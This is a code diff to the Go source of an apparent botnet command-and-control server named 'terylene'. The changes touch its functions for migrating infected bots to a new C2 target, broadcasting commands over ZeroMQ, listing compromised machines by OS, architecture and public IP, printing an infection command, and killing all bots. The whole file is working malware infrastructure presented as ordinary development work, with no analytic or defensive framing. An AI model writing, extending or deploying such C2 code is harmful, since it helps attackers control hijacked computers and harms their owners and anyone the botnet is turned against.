@@ -145,7 +145,7 @@ func routerhandle(router *zmq.Socket) {
 	}
 }
 
-func transferprompt(router *zmq.Socket, scanner *bufio.Scanner) {
+func transferprompt(router, publisher *zmq.Socket, scanner *bufio.Scanner) {
 	if len(aliveclient) == 0 {
 		fmt.Println("you dont have any online bots sadly :(")
 		return
@@ -180,16 +180,17 @@ func transferprompt(router *zmq.Socket, scanner *bufio.Scanner) {
 		for id := range aliveclient {
 			routmutex.Lock()
 			router.SendMessage(id, "migrate", target, rport)
-			fmt.Println(connIDs)
-			fmt.Println(connIDs[id])
+			broadcaster("migrate", connIDs[id], publisher)
 			routmutex.Unlock()
 			delete(aliveclient, id)
 			delete(tera, id)
+			delete(connIDs, id)
 			if count == intamount {
 				break
 			}
 		}
 		fmt.Println("operation successful!!!")
+
 	}
 }
 func getpubIp() string {
@@ -307,8 +308,10 @@ func main() {
 			fmt.Println(methods_list)
 		case "list":
 			fmt.Println("Number of bots:", len(aliveclient))
-			for _, bot := range tera {
-				fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\npublic ip: %s\n", bot.connID, bot.arch, bot.OS, bot.pubip)
+			if len(aliveclient) != 0 {
+				for _, bot := range tera {
+					fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\npublic ip: %s\n", bot.connID, bot.arch, bot.OS, bot.pubip)
+				}
 			}
 		case "payload":
 			fmt.Println("terylene payload:")
@@ -319,7 +322,7 @@ func main() {
 			}
 			fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
 		case "transfer":
-			transferprompt(router, scanner)
+			transferprompt(router, publisher, scanner)
 		case "killall":
 			broadcaster(command, "terylene", publisher)
 			clearScreen()
